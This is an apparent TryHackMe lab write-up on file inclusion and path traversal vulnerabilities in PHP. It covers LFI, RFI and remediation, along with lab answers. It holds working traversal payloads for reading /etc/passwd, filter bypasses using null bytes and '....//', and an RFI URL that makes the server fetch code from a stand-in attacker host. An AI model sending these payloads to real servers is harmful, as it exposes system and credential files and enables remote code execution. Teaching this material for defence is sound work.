# What is File inclusion?

<h3>What this room teach:</h3>

- File Inclusion Vulnerabilities: Learn about Local File Inclusion (LFI) and Remote File Inclusion (RFI).
- Understand Directory Traversal: Discover how directory traversal can be exploited in these vulnerabilities.
- Risk Assessment: Gain insights into the risks associated with these vulnerabilities if they are found in a system.
- Remediation: Learn about the necessary steps to mitigate and remediate file inclusion vulnerabilities.
- Practical Examples: Explore real-world examples of LFI, RFI, and directory traversal.
- Hands-On Challenges: Engage in hands-on challenges to apply your knowledge and enhance your skills in exploiting and securing against file inclusion vulnerabilities.

<h2></h2>

- Web applications may request access to files on a system via parameters.
- Parameters are query parameter strings in the URL.
- They can be used to retrieve data or perform actions based on user input.
- Parameters are used with Google searching, where GET requests pass user input into the search engine. https://www.google.com/search?q=TryHackMe.

<p align="center">
<br/>
<img src="https://i.imgur.com/dXlOFFY.png" height="90%" width="90%" alt=""/>
<br />

- User requests file access from a web server via an HTTP request.
- The request includes a specific file to display, such as "userCV.pdf."
- The format of the request is typically like "http://webapp.thm/get.php?file=userCV.pdf."
- "file" is a parameter in the request, and "userCV.pdf" is the desired file to access.
- This scenario illustrates a common method for requesting and displaying files in a web application.

<p align="center">
<br/>
<img src="https://i.imgur.com/HI5pnpw.png" height="90%" width="90%" alt=""/>
<br />

<h2></h2>

<h3>Why do File inclusion vulnerabilities happen?﻿</h3>

- File inclusion vulnerabilities are widespread in poorly written web applications.
- These vulnerabilities commonly affect programming languages like PHP.
- The main problem lies in the lack of proper input validation.
- User inputs are not sanitized or validated, allowing users to control them.
- Lack of validation enables users to pass arbitrary input to functions, leading to vulnerabilities.


<h3>What is the risk of File inclusion?</h3>

- File inclusion vulnerabilities can be exploited by attackers to access sensitive data like code and credentials.
- Attackers can use file inclusion in conjunction with other methods to achieve `Remote Command Execution` (RCE).
- It's crucial to identify and mitigate file inclusion vulnerabilities to protect web applications and operating systems.


<h2></h2>

# Path Traversal

- Path Traversal also known as Directory Traversal, is a web security vulnerability.
- It enables attackers to access server resources like local files.
- Attackers manipulate the web app's URL to locate and access files outside its root directory.
- Path traversal vulnerabilities stem from user input being used in functions like file_get_contents in PHP.
- The vulnerability is usually caused by inadequate input validation or filtering, not the function itself.
- In PHP, file_get_contents is used to read file content.

<p align="center">
<br/>
<img src="https://i.imgur.com/ZkcxsCL.png" height="90%" width="90%" alt=""/>
<br />
The following graph shows how a web application stores files in /var/www/app. The happy path would be the user requesting the contents of userCV.pdf from a defined path /var/www/app/CVs.

<h2></h2>

- URL parameters can be tested by adding payloads to analyze web application behavior.
- Path traversal attacks, also called dot-dot-slash attacks, exploit directory traversal using "../" to move up directories.
- Attackers can find entry points like "get.php?file=" and attempt to access sensitive files, e.g., "../../../../etc/passwd."
- Web application security should address and mitigate path traversal vulnerabilities to prevent unauthorized access to sensitive files.

<p align="center">
<br/>
<img src="https://i.imgur.com/sIAenYp.png" height="90%" width="90%" alt=""/>
<br />

- Lack of input validation can lead to serious security vulnerabilities.
- Web applications should always access files from trusted locations, such as /var/www/app/CVs.
- Directory traversal attacks can exploit unchecked input and potentially access sensitive system files like /etc/passwd.
- Proper input validation and access controls are essential to prevent such security risks.

<p align="center">
<br/>
<img src="https://i.imgur.com/pXzEHDS.png" height="90%" width="90%" alt=""/>
<br />
As a result, the web application sends back the file's content to the user.

<h2></h2>

<h3>Windows Server</h3>

- Attackers must tailor their web application exploits to the target server's operating system.
- When targeting a Windows server, the attacker should provide Windows file paths.
- Examples of potential Windows file paths for an attacker include "../../../../boot.ini" and "../../../../windows/win.ini".
- These paths can be used in malicious requests to access specific files on the target server.

<h2></h2>

<h3>Linux</h3>

The same concept applies here as with Linux operating systems, where we climb up directories until it reaches the root directory, which is usually c:\.

Some common OS files you could use when testing:

<p align="center">
<br/>
<img src="https://i.imgur.com/SafUKGG.png" height="90%" width="90%" alt=""/>
<br />

<h2></h2>

<h3>What function causes path traversal vulnerabilities in PHP?</h3>

Answer: `file_get_contents`


<h2></h2>

# Local File Inclusion - LFI

- LFI attacks often result from a lack of developer security awareness.
- PHP functions like `include`, `require`, `include_once`, and `require_once` can make web applications vulnerable to LFI attacks.
- LFI vulnerabilities can also occur in languages like ASP, JSP, and Node.js.
- LFI exploits are based on path traversal concepts.

<h2></h2>

<h3>LFI Scenarios</h3>

1. Suppose the web application provides two languages, and the user can select between the EN and AR

- PHP code utilizes a GET request with a "lang" URL parameter to determine which page to load.
- You can make HTTP requests like this: http://webapp.thm/index.php?lang=EN.php (for English) or http://webapp.thm/index.php?lang=AR.php (for Arabic).
- The English and Arabic pages (EN.php and AR.php) should be in the same directory as the PHP script.

<p align="center">
<br/>
<img src="https://i.imgur.com/tMjCDYm.png" height="90%" width="90%" alt=""/>
<br />

- Without proper input validation, it's theoretically possible to access and display any readable file on the server.
- The example URL provided, http://webapp.thm/get.php?file=/etc/passwd, could be used to attempt reading the /etc/passwd file on a Linux server.
- The /etc/passwd file contains sensitive information about Linux users, making it a potential security risk when accessed without authorization.
- It underscores the importance of implementing robust input validation and security measures in web applications to prevent unauthorized access to sensitive files. 

In this case, it works because there isn't a directory specified in the include function and no input validation.

<p align="center">
<br/>
<img src="https://i.imgur.com/fcBvq7W.png" height="90%" width="90%" alt=""/>
<br />

2. Next, In the following code, the developer decided to specify the directory inside the function.

- The code uses the "include" function to include PHP pages from the "languages" directory based on the "lang" parameter.
- Lack of input validation in the code makes it vulnerable to URL manipulation.
- An attacker can potentially replace the "lang" parameter with sensitive files like "/etc/passwd" due to this vulnerability.

<p align="center">
<br/>
<img src="https://i.imgur.com/f44M3iC.png" height="90%" width="90%" alt=""/>
<br />

- Payload resembles path traversal.
- Utilizes the 'include' function to include called files in the current page.
- Exploit example: http://webapp.thm/index.php?lang=../../../../etc/passwd.

<h2></h2>

<h3>Question 1: Give Lab #1 a try to read /etc/passwd. What would the request URI be</h3>

Answer:`/lab1.php?file=/etc/passwd`

<h3>Question 2: In Lab #2, what is the directory specified in the include function?</h3>

<p align="center">
<br/>
<img src="https://i.imgur.com/YSfjMgO.png" height="90%" width="90%" alt=""/>
<br />

Answer: `Includes`


<h2></h2>

# Local File Inclusion - LFI #2

A couple of techniques to bypass the filter within the include function.

1.  In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing black box testing, in which we don't have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app.

- Injecting a NULL BYTE at the end of the payload helps the include function disregard characters after it, allowing you to execute code like include("languages/../../../../../etc/passwd%00").".php");, which is equivalent to include("languages/../../../../../etc/passwd").

- Insert into the browser address bar.

NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.

Question 1: Give Lab #3 a try to read /etc/passwd. What is the request look like?

<p align="center">
<br/>
<img src="https://i.imgur.com/PnaPhRJ.png" height="90%" width="90%" alt=""/>
<br />

Answer: `/lab3.php?file=../../../../etc/passwd%00` 

<h2></h2>

2. In this section, the developer filtered keywords to protect sensitive data in the /etc/passwd file. Two possible bypass methods exist: utilizing NullByte %00 or the current directory trick ("/..") after the filtered keyword. These can be used to exploit the system, for example, by accessing
- `http://webapp.thm/index.php?lang=/etc/passwd/.`
- `http://webapp.thm/index.php?lang=/etc/passwd%00.`

<h2></h2>

- Using "cd .." in a file system moves you up one directory level.
- "cd ." keeps you in the current directory, making no change.
- In a file path like "/etc/passwd/..", ".." moves one level up to the parent directory.
- In a file path like "/etc/passwd/.", "." refers to the current directory, so it remains unchanged.
- Understanding the use of "." and ".." is essential for navigating and referencing directories in a file system.

<h2></h2>

Question 2: Which function is causing the directory traversal in Lab #4?

- If we put in `/etc/passwd/.`. We would get into the passwd file content.

<p align="center">
<br/>
<img src="https://i.imgur.com/m24AjUN.png" height="90%" width="90%" alt=""/>
<br />

- To get what function is causing the directory traversal in Lab 4, we can just put in random things on the bar like "THM".
  - It will show that "file_get_contents" is the function at the warning.
 
<p align="center">
<br/>
<img src="https://i.imgur.com/qb0Y5NK.png" height="90%" width="90%" alt=""/>
<br />

Answer: `file_get_contents`

<h2></h2>

3.  the developer starts to use input validation by filtering some keywords. Let's test out and check the error message!

`http://webapp.thm/index.php?lang=../../../../etc/passwd`

We got the following error!

Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15

- The web application replaces "../" with an empty string, making it difficult to perform directory traversal attacks.
- To bypass this protection, you can use a payload like "....//....//....//....//....//etc/passwd."
- This works because the PHP filter replaces only the first occurrence of "../" and doesn't perform a second pass, allowing the payload to succeed in directory traversal.

<p align="center">
<br/>
<img src="https://i.imgur.com/FA4ghgZ.png" height="90%" width="90%" alt=""/>
<br />

- If we put in `../../../../etc/passwd`. It will become `include(includes/etc/passwd)`.
- If we put in `....//..../..../.../etc/passwd`. It will become `nclude(includes/../../.././etc/passwd)`.

<p align="center">
<br/>
<img src="https://i.imgur.com/3X0t7IW.png" height="90%" width="90%" alt=""/>
<br />

<h2></h2>

4. Discuss the case where the developer forces the include to read from a defined directory!

- When a web application requires directory input, such as in the URL `http://webapp.thm/index.php?lang=languages/EN.php`, you can manipulate the input for potential exploitation.
- To exploit this, include the directory in your payload by modifying the parameter, e.g., `?lang=languages/../../../../../etc/passwd`.
- Using relative directory traversal techniques, like "../" sequences, can help you access sensitive files or directories on the server.

It's crucial to be cautious and ethical when testing for vulnerabilities in web applications, as unauthorized access or manipulation can be illegal and unethical.

<h2></h2>

Question 3: Try out Lab #6 and check what is the directory that has to be in the input field?

- When we put in random input in the File Name bar like "THM".
  - It said Access Denied! Allowed files at "THM-profile" folder only!
 
<p align="center">
<br/>
<img src="https://i.imgur.com/mSnKgQg.png" height="90%" width="90%" alt=""/>
<br />

Answer: `THM-profile`

<h2></h2>

Question 4: Try out Lab #6 and read /etc/os-release. What is the VERSION_ID value?

- When we put in `THM-profile/../../../../etc/os-release`
  - We can get the Version ID.
 
<p align="center">
<br/>
<img src="https://i.imgur.com/erzuZfz.png" height="90%" width="90%" alt=""/>
<br />

Answer: `12.04`


<h2></h2>

# Remote File Inclusion - RFI

- Remote File Inclusion (RFI) involves including remote files in a vulnerable application by exploiting improper input sanitization.
- RFI, like LFI, relies on a lack of input validation and requires the `allow_url_fopen` option to be enabled.
- RFI poses a higher risk than LFI because it can lead to Remote Command Execution (RCE) on the server.
- Consequences of a successful RFI attack include:
  - Sensitive Information Disclosure
  - Cross-site Scripting (XSS)
  - Denial of Service (DoS)
 
<h2></h2>

- RFI attack requires external server communication with the application server.
- Attacker hosts malicious files on their server.
- Malicious file is injected into the include function using HTTP requests.
- Content of the malicious file executes on the vulnerable application server.

<p align="center">
<br/>
<img src="https://i.imgur.com/FDzQm6L.png" height="90%" width="90%" alt=""/>
<br />

<h2></h2>

<h3>RFI Steps</h3>

- Let's say that the attacker hosts a PHP file on their own server `http://attacker.thm/cmd.txt`
- `cmd.txt` contains a printing message `Hello THM`.
  - `<?PHP echo "Hello THM"; ?>`
 
- First, the attacker injects the malicious URL.
  - `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`
  - If there is no input validation, then the malicious URL passes into the include function.
- Next, the web app server will send a `GET` request to the malicious server to fetch the file.
- As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker.
- In our case, the current page somewhere has to show the Hello THM message.


<h2></h2>

# Remediation

As a developer, it's crucial to understand web app vulnerabilities, how to detect them, and ways to prevent them. For file inclusion vulnerabilities, common prevention tips include:

- Keep system and services updated with the latest versions.
- Disable PHP errors to prevent information leakage.
- Consider using a Web Application Firewall (WAF) for enhanced security.
- Disable unnecessary PHP features like allow_url_fopen and allow_url_include.
- Carefully control protocols and PHP wrappers in your web application.
- Always implement thorough input validation to prevent file inclusion vulnerabilities.
- Use whitelisting for file names and locations and consider blacklisting where necessary.
